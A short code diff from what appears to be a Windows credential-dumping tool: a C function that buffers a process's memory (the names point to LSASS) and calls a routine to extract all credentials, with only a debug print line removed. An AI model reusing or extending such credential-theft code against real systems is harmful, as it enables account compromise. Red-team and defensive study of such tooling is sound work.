@@ -22,7 +22,6 @@ BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress)
     dc.BaseAddress = dumpBuffer;
     dc.rva = 0;
     dc.DumpMaxSize = DUMP_MAX_SIZE;
-    printf("Invoke Credzotron\n");
 
     // Dump creds and immediatly revert the process' impersonation token
     isDumped = ELSASS_ExtractAllCredz(&dc);
